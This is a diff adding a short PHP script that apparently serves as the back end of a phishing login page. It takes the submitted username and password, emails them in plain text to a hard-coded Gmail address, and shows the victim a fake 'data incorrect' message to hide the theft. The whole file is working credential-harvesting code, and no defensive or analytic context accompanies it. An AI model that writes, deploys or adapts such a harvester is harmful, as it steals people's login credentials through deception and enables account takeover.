@@ -1,0 +1,19 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+
+    $to = "garciasraviaaxel@gmail.com";
+    $subject = "Inicio de sesión - Datos de usuario";
+    $message = "Usuario: " . $username . "\nContraseña: " . $password;
+
+    // Envía el correo electrónico
+    $result = mail($to, $subject, $message);
+
+    if ($result) {
+        echo "Los datos son incorrectos";
+    } else {
+        echo "Hubo un error al enviar los datos.";
+    }
+}
+?>
